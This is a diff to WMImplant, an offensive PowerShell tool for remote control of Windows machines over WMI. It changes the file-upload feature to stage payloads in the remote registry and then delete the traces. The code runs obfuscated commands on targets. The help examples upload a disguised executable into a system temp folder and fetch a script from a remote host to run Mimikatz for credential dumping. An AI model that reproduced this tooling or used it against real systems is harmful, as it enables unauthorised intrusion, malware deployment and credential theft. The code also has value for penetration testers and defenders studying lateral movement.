@@ -893,21 +893,17 @@ function Invoke-CommandGeneration
 
         "upload"
         {
-            $LocalUserUpload = Read-Host "Please provide the local user account for connecting back over WMI >"
-            $LocalUserUpload = $LocalUserUpload.Trim().ToLower()
-            $LocalPassUpload = Read-Host "Please provide the password associated with the account >"
-
             $FileToUpload = Read-Host "Please provide the full path to the local file you want to upload >"
             $UploadLocation = Read-Host "Please provide the full path to the location you'd like to upload the file >"
 
             if (($AnyCreds -eq "yes") -or ($AnyCreds -eq "y"))
             {
-                $Command = "`nInvoke-WMImplant -command upload -LocalUser $LocalUserUpload -LocalPass $LocalPassUpload -LocalFile $FileToUpload -RemoteFile $UploadLocation -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
+                $Command = "`nInvoke-WMImplant -command upload -LocalFile $FileToUpload -RemoteFile $UploadLocation -Target $GenTarget -RemoteUser $GenUsername -RemotePass $GenPassword`n"
             }
 
             else
             {
-                $Command = "`nInvoke-WMImplant -command upload -LocalUser $LocalUserUpload -LocalPass $LocalPassUpload -LocalFile $FileToUpload -RemoteFile $UploadLocation -Target $GenTarget`n"
+                $Command = "`nInvoke-WMImplant -command upload -LocalFile $FileToUpload -RemoteFile $UploadLocation -Target $GenTarget`n"
             }
             $Command
         }
@@ -2060,12 +2056,6 @@ function Invoke-WMImplant
     .PARAMETER RemotePass
     Specify the password for the appropriate user. This is the password for the account used to connect to remote systems.
 
-    .PARAMETER LocalUser
-    This parameter is required when a remote system needs to connect back to the local system for a WMImplant command.
-
-    .PARAMETER LocalPass
-    This parameter is the password for the account used when it is required for a remote system to connect back to the local system for a WMImplant command.
-
     .PARAMETER Command
     If using the CLI, specify the command that you want to use.
 
@@ -2143,7 +2133,7 @@ function Invoke-WMImplant
     This command uses the "cat" command, and attempts to read the pass.txt file within the context of the current user on the windowspc system
 
     .EXAMPLE
-    > Invoke-WMImplant -Command upload -LocalFile C:\notavirus.exe -RemoteUser Chris -RemotePass pass123 -RemoteFile C:\Windows\TEMP\safe.exe -Target securewindows -LocalUser King -LocalPass ofthejungle
+    > Invoke-WMImplant -Command upload -LocalFile C:\notavirus.exe -RemoteUser Chris -RemotePass pass123 -RemoteFile C:\Windows\TEMP\safe.exe -Target securewindows
     This command uploads the C:\notavirus.exe file locally to the securewindows system at C:\Windows\TEMP\safe.exe and authenticates to the remote system with the Chris account and the target downloads it from local systme using the King account.
 
     .EXAMPLE
@@ -2163,7 +2153,7 @@ function Invoke-WMImplant
     This command uses the current user's context to search the "computer2" system for any file on the C drive that has a "sql" file extension.
 
     .EXAMPLE
-    > Invoke-WMImplant -Command remote_posh -Url http://192.168.23.13/test.ps1 -Function Invoke-Mimikatz -LocalUser test\chris -LocalPass password123 -Target win7sys -RemoteUser test\admin -Pass admin123
+    > Invoke-WMImplant -Command remote_posh -Url http://192.168.23.13/test.ps1 -Function Invoke-Mimikatz -Target win7sys -RemoteUser test\admin -Pass admin123
     This command authenticates to the remote system using the provided admin account, downloads the test.ps1 script in memory and runs Invoke-Mimikatz, and returns the output to the local system over WMI.
     
     .EXAMPLE
@@ -2240,10 +2230,6 @@ function Invoke-WMImplant
         [string]$RemotePass,
         [Parameter(Mandatory = $False)]
         [string]$RemoteID,
-        [Parameter(Mandatory = $False)]
-        [string]$LocalUser,
-        [Parameter(Mandatory = $False)]
-        [string]$LocalPass,
         [Parameter(Mandatory = $False)]
         [string]$LocalFile,
         [Parameter(Mandatory = $False)]
@@ -2469,11 +2455,6 @@ function Invoke-WMImplant
                         Throw "You need to specify a target to run the command against!"
                     }
 
-                    if(!$LocalUser -or !$LocalPass)
-                    {
-                        Throw "Please provide the LocalUser and LocalPass parameters to use for upload functionality!"
-                    }
-
                     if(!$LocalFile)
                     {
                         Throw "Please use the LocalFile flag to specify the file to upload!"
@@ -2488,12 +2469,12 @@ function Invoke-WMImplant
                     {
                         if($RemoteCredential)
                         {
-                            Invoke-FileTransferWMImplant -Creds $RemoteCredential -Upload -UploadFile $LocalFile -UploadFilePath $RemoteFile -Target $Computer -LocalUser $LocalUser -LocalPass $LocalPass
+                            Invoke-FileTransferWMImplant -Creds $RemoteCredential -Upload -UploadFile $LocalFile -UploadFilePath $RemoteFile -Target $Computer
                         }
 
                         else
                         {
-                            Invoke-FileTransferWMImplant -Upload -UploadFile $LocalFile -UploadFilePath $RemoteFile -Target $Computer -LocalUser $LocalUser -LocalPass $LocalPass
+                            Invoke-FileTransferWMImplant -Upload -UploadFile $LocalFile -UploadFilePath $RemoteFile -Target $Computer
                         }
                     }
                 }
@@ -4004,11 +3985,7 @@ function Invoke-FileTransferWMImplant
         [Parameter(Mandatory = $False)]
         [string]$UploadFile,
         [Parameter(Mandatory = $False)]
-        [string]$UploadFilePath,
-        [Parameter(Mandatory = $False)]
-        [string]$LocalUser,
-        [Parameter(Mandatory = $False)]
-        [string]$LocalPass
+        [string]$UploadFilePath
     )
 
     Process
@@ -4061,14 +4038,12 @@ function Invoke-FileTransferWMImplant
 
             if($Creds)
             {
-                Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -Creds $creds -ObfuscateWithEnvVar
+                Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -Creds $Creds -ObfuscateWithEnvVar
             }
             else
             {
                 Invoke-WMIObfuscatedPSCommand -PSCommand $remote_command -Target $Target -ObfuscateWithEnvVar
             }
-
-
 
             Write-Verbose "Sleeping to let remote system read and store file"
             Start-Sleep -s 30
@@ -4125,28 +4100,24 @@ function Invoke-FileTransferWMImplant
                 $Upload_Dir = $UploadFilePath
             }
 
-            if(!$LocalUser -or !$LocalPass)
-            {
-                Write-Verbose "Please provide username and password for this system!"
-                $LocalUser = Read-Host "What's the domain\username account for the system WMImplant is running on? >"
-                $LocalUser = $LocalUser
-                $LocalPass = Read-Host "Password >"
-                $LocalPass = $LocalPass
-            }
-
             # Read in file and base64 encode it
-            Write-Verbose "Read in local file and base64 encode it"
+            Write-Verbose "Read in local file and encode it"
             $filecontents = Get-Content -Encoding byte $Upload_File
             $filecontentencoded = [Int[]][Char[]]$filecontents -Join ','
 
-            Write-Verbose "Writing encoded file to local registry"
-            $localkey = New-ItemProperty -Path $fullregistrypath -Name $registryupname -Value $filecontentencoded -PropertyType String -Force
+            Write-Verbose "Writing encoded file to remote registry"
+            if($Creds)
+            {
+                $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'SetStringValue' -ArgumentList $reghive, $regpath, $filecontentencoded, $registryupname -ComputerName $Target -Credential $Creds
+            }
+            else
+            {
+                $remote_reg = Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'SetStringValue' -ArgumentList $reghive, $regpath, $filecontentencoded, $registryupname -ComputerName $Target
+            }
             
             # grabs registry value and saves to disk
             Write-Verbose "Connecting to $Target"
-            $remote_posh = '$Hive = 2147483650; $key = ''' + "$regpath'" + '; $value = ''' + "$registryupname" + '''; $pas = ConvertTo-SecureString ''' + "$LocalPass'" + ' -asplaintext -force; $crd = New-Object -Typename System.Management.Automation.PSCredential -Argumentlist ''' + "$LocalUser'" +',$pas; $out = Invoke-WmiMethod -Namespace ''root\default'' -Class ''StdRegProv'' -Name ''GetStringValue'' -ArgumentList $Hive, $key, $value -ComputerName ' + "$SystemHostname" + ' -Credential $crd; $decode = [char[]][int[]]$out.sValue.Split('','') -Join ''''; Set-Content -Path ' + "$Upload_Dir" + ' -Value $decode'
-            
-            $remote_command = $remote_posh
+            $remote_command = '$Hive = 2147483650; $key = ''' + "$regpath'" + '; $value = ''' + "$registryupname" + '''; $out = Invoke-WmiMethod -Namespace ''root\default'' -Class ''StdRegProv'' -Name ''GetStringValue'' -ArgumentList $Hive, $key, $value; $decode = [char[]][int[]]$out.sValue.Split('','') -Join ''''; Set-Content -Path ' + "$Upload_Dir" + ' -Value $decode'
 
             if($Creds)
             {
@@ -4162,7 +4133,14 @@ function Invoke-FileTransferWMImplant
 
             # Remove registry key
             Write-Verbose "Removing registry value storing uploaded file"
-            $local_reg = Remove-ItemProperty -Path $fullregistrypath -Name $registryupname
+            if($Creds)
+            {
+                Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registryupname -ComputerName $Target -Credential $Creds
+            }
+            else
+            {
+                Invoke-WmiMethod -Namespace 'root\default' -Class 'StdRegProv' -Name 'DeleteValue' -Argumentlist $reghive, $regpath, $registryupname -ComputerName $Target
+            }
 
             Write-Verbose "Done!"
         }
